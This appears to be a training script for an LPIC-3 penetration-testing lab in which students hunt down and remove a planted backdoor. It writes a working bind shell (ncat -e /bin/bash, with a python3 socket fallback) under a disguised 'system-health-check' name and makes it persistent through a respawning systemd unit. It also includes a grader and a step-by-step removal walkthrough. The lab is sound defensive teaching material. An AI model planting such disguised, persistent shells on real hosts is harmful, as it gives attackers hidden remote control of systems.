#!/usr/bin/env bash
#
# ==============================================================================
#  LPIC-3 303 (Security) — Exam 303-300, version 3.0.0
#  Topic 335.2: Penetration Testing (exam weight: 5.0)
#  Reference: https://www.lpi.org/our-certifications/exam-303-objectives/
#
#  BREAK & FIX LAB — "The backdoor the pentester left behind"
#  ----------------------------------------------------------------------------
#  A penetration test does not end when the tester gets a shell. Part of the
#  engagement is post-exploitation: dropping a persistence mechanism, and then
#  — during the debrief — the blue team has to FIND and REMOVE it. This lab
#  puts you on the blue-team side of a purple-team exercise. The script plants
#  a realistic (but network-safe) bind-shell backdoor with systemd persistence,
#  disguised under an innocuous name. Your job is to hunt it with the same
#  tools a pentester uses for host enumeration — nmap, ss, lsof, systemctl —
#  and eradicate it, persistence included.
#
#  This exercises the 335.2 tooling and concepts directly:
#    - nmap host/service scanning (-p-, -sV, -sS)
#    - ncat as a listener (a 335.2 utility)
#    - the post-exploitation "persistence" phase of a penetration test
#    - the legal/authorization boundary: you may ONLY do this on hosts you own
#
#  SAFETY / SCOPE
#  ----------------------------------------------------------------------------
#    * Run this ONLY on a DISPOSABLE lab VM that you own and can throw away.
#    * The bind shell is bound to 127.0.0.1 (loopback) ONLY. It is never
#      reachable from the network. Do NOT change the bind address.
#    * Authorization matters: scanning and backdooring machines you do not own
#      is a crime in most jurisdictions. This lab targets localhost, by you,
#      on your own VM. Keep it that way.
#
#  USAGE
#    sudo ./335.2-break-and-fix.sh break     # plant the backdoor (default)
#    sudo ./335.2-break-and-fix.sh status    # self-grade: did you fix it?
#    sudo ./335.2-break-and-fix.sh reset      # instructor escape hatch: full teardown
# ==============================================================================

set -euo pipefail

# ------------------------------- Lab constants --------------------------------
PORT=4444                                            # Metasploit's classic default port — a nice tell
UNIT_NAME="system-health-check"                      # disguised: friendly name, hostile payload
BACKDOOR="/usr/local/sbin/${UNIT_NAME}"              # the artifact you must locate
UNIT_FILE="/etc/systemd/system/${UNIT_NAME}.service" # the persistence you must dismantle
MARKER="/opt/lab-335.2/.provenance"                  # so 'reset' knows this was OUR mess

# --------------------------------- Helpers ------------------------------------
say()  { printf '%s\n' "$*"; }
info() { printf '\033[36m[*]\033[0m %s\n' "$*"; }
ok()   { printf '\033[32m[+]\033[0m %s\n' "$*"; }
warn() { printf '\033[33m[!]\033[0m %s\n' "$*"; }
die()  { printf '\033[31m[x]\033[0m %s\n' "$*" >&2; exit 1; }

require_root() {
  [ "$(id -u)" -eq 0 ] || die "This lab manipulates systemd units; run it as root (sudo)."
}

require_systemd() {
  command -v systemctl >/dev/null 2>&1 || die "This lab requires a systemd-based host."
}

# Best-effort package install across the LPIC-relevant package managers.
pm_install() {
  local pkgs="$*"
  if   command -v apt-get >/dev/null 2>&1; then apt-get update -qq && apt-get install -y $pkgs
  elif command -v dnf     >/dev/null 2>&1; then dnf install -y $pkgs
  elif command -v yum     >/dev/null 2>&1; then yum install -y $pkgs
  elif command -v zypper  >/dev/null 2>&1; then zypper --non-interactive install $pkgs
  elif command -v pacman  >/dev/null 2>&1; then pacman -Sy --noconfirm $pkgs
  else warn "No known package manager found; install '$pkgs' by hand."; return 1
  fi
}

# The student needs nmap to solve the lab. Make sure it is present.
ensure_scanner() {
  if ! command -v nmap >/dev/null 2>&1; then
    info "nmap not found — installing it so you can scan the host."
    pm_install nmap || warn "Could not auto-install nmap; install it manually before starting."
  fi
}

# The backdoor prefers ncat (a 335.2 utility). If unavailable it falls back to a
# python3 loopback listener at RUNTIME, so the lab still works everywhere.
ensure_listener() {
  if command -v ncat >/dev/null 2>&1; then return 0; fi
  info "ncat not found — attempting to install it (package name varies by distro)."
  pm_install ncat        >/dev/null 2>&1 || \
  pm_install nmap-ncat   >/dev/null 2>&1 || \
  pm_install nmap        >/dev/null 2>&1 || true
  if ! command -v ncat >/dev/null 2>&1 && ! command -v python3 >/dev/null 2>&1; then
    die "Neither ncat nor python3 is available for the listener; install one and retry."
  fi
}

port_is_open() { ss -ltnH 2>/dev/null | grep -q "127.0.0.1:${PORT}[[:space:]]"; }

# --------------------------------- BREAK --------------------------------------
do_break() {
  require_root
  require_systemd
  ensure_scanner
  ensure_listener

  warn "About to plant a LOOPBACK-ONLY bind-shell backdoor with systemd persistence."
  warn "Do this ONLY on a disposable lab VM you own. Ctrl-C now to abort."
  if [ "${LAB_FORCE:-0}" != "1" ]; then
    read -r -p "Type 'yes' to arm the lab: " reply
    [ "$reply" = "yes" ] || die "Aborted. Nothing was changed."
  fi

  mkdir -p "$(dirname "$MARKER")"
  printf 'lpic-3-303 topic 335.2 break-and-fix lab artifact\n' > "$MARKER"

  # --- Drop the disguised payload. Note it prefers ncat, falls back to python3.
  cat > "$BACKDOOR" <<OUTER
#!/usr/bin/env bash
# system-health-check
# LAB ARTIFACT for LPIC-3 335.2 — a loopback bind shell. NOT a real health check.
# Bound to 127.0.0.1 ONLY. Do not deploy anywhere.
PORT=${PORT}
if command -v ncat >/dev/null 2>&1; then
  exec ncat -lk 127.0.0.1 "\$PORT" -e /bin/bash
elif command -v python3 >/dev/null 2>&1; then
  exec python3 - "\$PORT" <<'PY'
import socket, subprocess, sys, os
port = int(sys.argv[1])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", port))
s.listen(1)
while True:
    conn, _ = s.accept()
    for fd in (0, 1, 2):
        os.dup2(conn.fileno(), fd)
    subprocess.call(["/bin/bash", "-i"])
    conn.close()
PY
else
  echo "no listener available" >&2
  exit 1
fi
OUTER
  chmod 0755 "$BACKDOOR"

  # --- Install the persistence unit: Restart=always makes it respawn on kill,
  #     and 'enable' makes it survive a reboot. This is the twist that catches
  #     students who only 'kill' the process.
  cat > "$UNIT_FILE" <<UNIT
[Unit]
Description=System Health Check
After=network.target

[Service]
Type=simple
ExecStart=${BACKDOOR}
Restart=always
RestartSec=2

[Install]
WantedBy=multi-user.target
UNIT

  systemctl daemon-reload
  systemctl enable --now "${UNIT_NAME}.service" >/dev/null 2>&1
  sleep 3   # give the listener time to bind before we report the symptom

  # ------------------------------ Brief the student -------------------------
  cat <<BRIEF

================================================================================
  LPIC-3 335.2  —  BREAK & FIX  —  "The backdoor the pentester left behind"
================================================================================

WHAT HAPPENED
  A penetration tester (this script) has compromised your lab host and installed
  a persistence mechanism. There is now a hidden bind shell listening on this
  machine, and it is configured to come back if you simply kill it or reboot.

THE SYMPTOM YOU WILL SEE
  * A port that should NOT be open is now listening on the host. A full TCP
    scan of localhost will reveal it:
        nmap -sV -p- 127.0.0.1
    Expect an extra open port around ${PORT}/tcp that nmap struggles to
    fingerprint (an anonymous shell speaks no real protocol).
  * If you find the process and 'kill' it, WITHIN A FEW SECONDS THE PORT
    REOPENS. That is the persistence fighting back. Killing the symptom is
    not enough — you must find and remove what respawns it.
  * The payload is deliberately disguised under a friendly, sysadmin-sounding
    name. Do not trust a process just because it "sounds legitimate."

YOUR OBJECTIVE (what "fixed" means)
  1. Discover the rogue listening port using nmap against 127.0.0.1.
  2. Map the port to the exact PID and on-disk binary (ss / lsof).
  3. Trace WHAT keeps it alive (the persistence mechanism) and disable it so it
     does NOT respawn and does NOT survive a reboot.
  4. Remove the dropped artifact(s) from disk.
  5. Re-scan: the port must be gone and must stay gone.

  Constraint: the backdoor is bound to 127.0.0.1 only. Keep it that way while
  you investigate — this is your own host, and the goal is remediation, not
  further exploitation.

CHECK YOUR WORK
  When you think you are done, grade yourself:
        sudo $0 status

  Good hunting.
================================================================================
BRIEF
}

# --------------------------------- STATUS -------------------------------------
# Self-grader. PASS only when the port is closed, the unit is gone, and the
# dropped binary is removed. Gives granular feedback so the student learns which
# layer they missed (a common mistake: killing the process but leaving the unit).
do_status() {
  require_systemd
  local fail=0

  if port_is_open; then
    warn "Port ${PORT}/tcp is STILL listening on 127.0.0.1 — the backdoor is active."
    fail=1
  else
    ok "Port ${PORT}/tcp is closed. The listener is down."
  fi

  if systemctl is-active --quiet "${UNIT_NAME}.service" 2>/dev/null; then
    warn "Unit '${UNIT_NAME}.service' is still ACTIVE — persistence will respawn the shell."
    fail=1
  elif systemctl is-enabled --quiet "${UNIT_NAME}.service" 2>/dev/null; then
    warn "Unit '${UNIT_NAME}.service' is disabled but ENABLED at boot — it will return after a reboot."
    fail=1
  else
    ok "No active/enabled '${UNIT_NAME}.service' persistence remains."
  fi

  if [ -f "$UNIT_FILE" ]; then
    warn "Unit file still on disk: ${UNIT_FILE}"
    fail=1
  else
    ok "Unit file removed."
  fi

  if [ -f "$BACKDOOR" ]; then
    warn "Payload still on disk: ${BACKDOOR}"
    fail=1
  else
    ok "Dropped payload removed."
  fi

  echo
  if [ "$fail" -eq 0 ]; then
    ok "PASS — the host is clean. You found the backdoor, killed the persistence, and scrubbed disk. Well done."
    [ -f "$MARKER" ] && rm -f "$MARKER" 2>/dev/null || true
  else
    die "NOT DONE YET — remediate the items marked [!] above, then re-run 'status'."
  fi
}

# ---------------------------------- RESET -------------------------------------
# Instructor escape hatch: unconditionally tear the lab down.
do_reset() {
  require_root
  require_systemd
  systemctl disable --now "${UNIT_NAME}.service" >/dev/null 2>&1 || true
  rm -f "$UNIT_FILE" "$BACKDOOR" "$MARKER"
  systemctl daemon-reload || true
  systemctl reset-failed "${UNIT_NAME}.service" >/dev/null 2>&1 || true
  ok "Lab 335.2 fully reset. Host is clean."
}

# --------------------------------- Dispatch -----------------------------------
case "${1:-break}" in
  break)  do_break  ;;
  status) do_status ;;
  reset)  do_reset  ;;
  *)      die "Unknown action '${1}'. Use: break | status | reset" ;;
esac


# ==============================================================================
#  SOLUTION — STEP BY STEP  (read only after you have genuinely tried)
# ==============================================================================
#
#  The workflow mirrors a real host-triage / blue-team response and uses the
#  exact 335.2 toolset. Do NOT jump to the answer; the value is in the hunt.
#
#  ----------------------------------------------------------------------------
#  STEP 1 — Enumerate: scan localhost the way a pentester enumerates a host
#  ----------------------------------------------------------------------------
#    A quick scan of the well-known range will already look suspicious, but do
#    a FULL 65535-port scan with service/version detection — anonymous shells
#    hide on high, non-standard ports:
#
#        nmap -sV -p- 127.0.0.1
#
#    Expected (abridged) output:
#        Starting Nmap ... at 2026-08-25 ...
#        Nmap scan report for localhost (127.0.0.1)
#        ...
#        PORT     STATE SERVICE  VERSION
#        22/tcp   open  ssh      OpenSSH ...
#        4444/tcp open  krb524?          <-- unexpected; nmap can't fingerprint it
#        ...
#        Service detection performed. ...
#
#    The "?" / mislabelled service and the odd port number are the tell: a
#    real service announces a real protocol banner; a raw bind shell does not.
#    (An SYN scan, nmap -sS -p- 127.0.0.1, gives the same finding faster if you
#    run nmap as root.)
#
#  ----------------------------------------------------------------------------
#  STEP 2 — Attribute the port to a process and an on-disk file
#  ----------------------------------------------------------------------------
#    nmap tells you a port is open; now bind it to a PID and a binary locally:
#
#        ss -ltnp 'sport = :4444'
#    Expected:
#        State  Recv-Q Send-Q Local Address:Port ... Process
#        LISTEN 0      1        127.0.0.1:4444   ...  users:(("system-health-che",pid=1234,fd=3))
#
#        sudo lsof -i :4444
#    Expected:
#        COMMAND    PID USER   FD  TYPE ... NAME
#        system-he 1234 root    3u IPv4 ... TCP localhost:4444 (LISTEN)
#
#    Follow the PID to the executable on disk (do not trust the friendly name):
#        sudo ls -l /proc/1234/exe
#        sudo readlink /proc/1234/exe        # -> /usr/local/sbin/system-health-check (or ncat/python3)
#        sudo cat /usr/local/sbin/system-health-check   # confirm: it's a loopback bind shell, NOT a health check
#
#  ----------------------------------------------------------------------------
#  STEP 3 — Prove the persistence (why 'kill' alone fails)
#  ----------------------------------------------------------------------------
#    Try the naive fix first, on purpose, to SEE the persistence react:
#        sudo kill 1234
#        sleep 3
#        ss -ltn | grep 4444        # the port is BACK — something respawned it
#
#    Find what owns/respawns the process:
#        systemctl status 4444/tcp 2>/dev/null || true
#        sudo systemctl status system-health-check.service
#        systemctl list-units --type=service | grep -i health
#        systemctl cat system-health-check.service   # note: ExecStart=... Restart=always, and it's enabled
#
#    Restart=always is why 'kill' failed; 'enabled' (WantedBy=multi-user.target)
#    is why it would also survive a reboot.
#
#  ----------------------------------------------------------------------------
#  STEP 4 — Eradicate the persistence, then the process
#  ----------------------------------------------------------------------------
#    Stop AND disable in one shot (disable removes the boot symlink; --now stops it):
#        sudo systemctl disable --now system-health-check.service
#
#    (Optional belt-and-suspenders: mask it so nothing can start it again while
#     you finish cleaning up:  sudo systemctl mask system-health-check.service
#     — remember to `unmask` before deleting the unit if you mask it.)
#
#  ----------------------------------------------------------------------------
#  STEP 5 — Scrub the dropped artifacts from disk and reload systemd
#  ----------------------------------------------------------------------------
#        sudo rm -f /etc/systemd/system/system-health-check.service
#        sudo rm -f /usr/local/sbin/system-health-check
#        sudo systemctl daemon-reload
#        sudo systemctl reset-failed system-health-check.service 2>/dev/null || true
#
#  ----------------------------------------------------------------------------
#  STEP 6 — Verify remediation the same way you found it
#  ----------------------------------------------------------------------------
#        nmap -sV -p- 127.0.0.1        # 4444/tcp must be gone
#        ss -ltnp | grep 4444 || echo "clean"
#        sudo systemctl status system-health-check.service   # Unit ... could not be found.
#
#    Then grade yourself:
#        sudo ./335.2-break-and-fix.sh status   # -> PASS
#
#  ----------------------------------------------------------------------------
#  REAL-WORLD NOTE (why this is exam-relevant, not a toy)
#  ----------------------------------------------------------------------------
#    * A genuine penetration test verifies persistence in exactly these layers,
#      and a real attacker chains SEVERAL (systemd unit + cron + shell rc +
#      SUID binary). Removing one is not "clean." Always re-enumerate after
#      each removal until the host is quiet across TWO independent checks.
#    * The disguised name is the lesson: triage by behaviour (an unexplained
#      listening socket) and provenance (a binary in /usr/local/sbin with no
#      package owner: `rpm -qf` / `dpkg -S` returns "not owned"), never by the
#      reassuring string in `Description=`.
#    * Authorization is the first phase of ANY penetration test. Everything
#      above is legal here only because it is your own disposable VM, scanned
#      over loopback, by you.
#
#  Sources:
#    - LPIC-3 303 exam objectives:
#        https://www.lpi.org/our-certifications/exam-303-objectives/
#    - Nmap reference guide (host discovery, -p-, -sV, -sS):
#        https://nmap.org/book/man.html
#    - Ncat users' guide (listen mode, -l/-k/-e):
#        https://nmap.org/ncat/guide/index.html
#    - systemd.service (Restart=, ExecStart=, [Install] WantedBy=):
#        https://www.freedesktop.org/software/systemd/man/systemd.service.html
#    - ss(8), lsof(8) — socket/process attribution:
#        https://man7.org/linux/man-pages/man8/ss.8.html
#        https://man7.org/linux/man-pages/man8/lsof.8.html
# ==============================================================================